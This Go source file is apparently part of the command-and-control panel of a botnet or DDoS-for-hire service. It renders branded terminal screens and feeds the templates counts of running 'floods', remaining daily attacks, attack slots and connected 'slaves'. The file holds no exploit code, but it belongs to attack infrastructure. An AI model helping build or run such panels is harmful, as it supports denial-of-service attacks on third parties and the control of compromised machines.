package sessions

import (
	"bytes"
	"cnc/internal"
	"cnc/internal/database"
	"cnc/pkg/gradient"
	"cnc/pkg/swash"
	"cnc/pkg/swash/evaluator"
	"path/filepath"
)

// ExecuteBranding will execute a swash script
func (s *Session) ExecuteBranding(objects map[string]any, branding ...string) error {
	var buffer = new(bytes.Buffer)

	tokenizer, err := swash.NewTokenizerSourcedFromFile(filepath.Join(append([]string{"resources", "branding", s.UserProfile.Theme}, branding...)...))
	if err != nil {
		return err
	}

	if err := tokenizer.Parse(); err != nil {
		return err
	}

	eval := evaluator.NewEvaluator(tokenizer, buffer, s.Terminal.Channel)
	if err := s.sync(eval); err != nil {
		return err
	}

	// iterates through all specific custom objects
	for key, value := range objects {
		err := eval.Memory.Go2Swash(key, value)
		if err == nil {
			continue
		}

		return err
	}

	// finally execute it
	if err := eval.Execute(); err != nil {
		return err
	}

	if buffer.Len() < 1 {
		return s.Print(buffer.String())
	}

	return s.Println(buffer.String())
}

// ExecuteBrandingToString will execute a swash script into a string
func (s *Session) ExecuteBrandingToString(objects map[string]any, branding ...string) (string, error) {
	var buffer = new(bytes.Buffer)

	// create new tokenizer
	tokenizer, err := swash.NewTokenizerSourcedFromFile(filepath.Join(append([]string{"resources", "branding", s.UserProfile.Theme}, branding...)...))
	if err != nil {
		return "", err
	}

	// parse tokens
	if err := tokenizer.Parse(); err != nil {
		return "", err
	}

	// create new evaluator >.<
	eval := evaluator.NewEvaluator(tokenizer, buffer, buffer)

	if err := s.sync(eval); err != nil {
		return "", err
	}

	// iterates through all specific custom objects
	if objects != nil {
		for key, value := range objects {
			err := eval.Memory.Go2Swash(key, value)
			if err != nil {
				return "", err
			}
		}
	}

	// finally execute it
	if err := eval.Execute(); err != nil {
		return "", err
	}

	return buffer.String(), nil
}

// ExecuteBrandingToStringNoError will execute a swash script into a string with no error
func (s *Session) ExecuteBrandingToStringNoError(objects map[string]any, branding ...string) string {
	literal, err := s.ExecuteBrandingToString(objects, branding...)
	if err != nil {
		return err.Error()
	}

	return literal
}

func (s *Session) sync(evaluator *evaluator.Evaluator) error {
	count := database.Logs.RunningCount(false)
	apiCount := database.Logs.RunningCount(true)
	left := s.LeftAttacks()

	var builtIn = map[string]any{
		"user":         s.UserProfile,
		"glamour":      gradient.New,
		"fastgradient": gradient.Fast,

		"sessions": map[string]any{
			"length": Count(),
		},

		"floods": map[string]any{
			"running":    count,
			"apiRunning": apiCount,
			"left":       left,
			"max":        s.DailyAttacks,
			"slots":      internal.GlobalSlots,
			"apiSlots":   internal.ApiSlots,
		},

		"slaves": map[string]any{
			"length": s.Count(),
		},

		"theme": map[string]any{
			"instance": s.Theme,
		},
	}

	// add all std thingies 2 swash
	for key, value := range builtIn {
		if err := evaluator.Memory.Go2Swash(key, value); err != nil {
			return err
		}
	}

	return nil
}
